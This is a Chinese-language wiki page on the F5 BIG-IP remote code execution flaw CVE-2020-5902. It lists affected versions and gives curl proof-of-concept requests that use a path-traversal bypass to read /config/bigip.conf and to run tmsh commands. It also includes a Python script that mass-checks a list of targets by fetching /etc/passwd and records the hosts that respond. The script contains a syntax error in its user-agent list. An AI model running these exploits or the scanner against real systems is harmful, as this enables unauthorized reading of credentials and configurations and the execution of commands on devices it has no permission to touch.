---
title: F5-Big-IP
---

## 应用简介

BIG-IP是美国F5公司的一款集成网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台

## [CVE-2020-5902]-BIG-IP 远程代码执行

**漏洞概述**
```http
#影响范围
BIG-IP 15.1.0
BIG-IP 14.1.0~14.1.2
BIG-IP 13.1.0~13.1.3
BIG-IP 12.1.0~12.1.5
BIG-IP 11.6.1~11.6.5
```

认证绕过导致远程代码执行漏洞

攻击者可利用该漏洞执行任意的系统命令、创建或删除文件，关闭服务/执行任意的Java代码

**漏洞利用**

文件读取POC

```bash
curl -v -k "https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf"
```

RCE-POC

```bash
curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
```

**批量验证POC**

```python
#coding=utf-8
'''
说明：这个方法可能会少量漏报
author: wintrysec
用法:urls.txt中存放目标资产列表（URL或IP都行），验证成功的结果保存在success.txt，python CVE-2020-5902-批量.py
'''

import requests
import argparse
import json

import warnings
warnings.filterwarnings('ignore')#忽略SSL警告

USER_AGENTS = [
    "User-Agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
]

headers = {}

def F5(url, i):
    checkUrl = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
    try:
        res = requests.get(checkUrl, headers=headers,timeout=3,verify=False)
        print(res.status_code)
        if res.status_code is 200:
            print('[{i} +++] The {url} has Vuln !!!!!!!!!!!!'.format(url=url,i=i)+'\n')
            with open('success.txt', 'a') as f1:
            	f1.write(url + '\n')
        else:
            print('[{i} xxx] The {url} Not has Vuln'.format(url=url,i=i)+'\n')
    except:
        print("{url} 连接超时\n".format(url=url))

def get_url():
    i = 1
    with open('urls.txt', 'r') as f:
        for line in f:
            url = line.replace('\n', '')
            if url[0:5] == 'https':
                url = url
            else:
                url = 'https://' + url
            F5(url, i)
            i += 1
if __name__ == '__main__':
	get_url()
```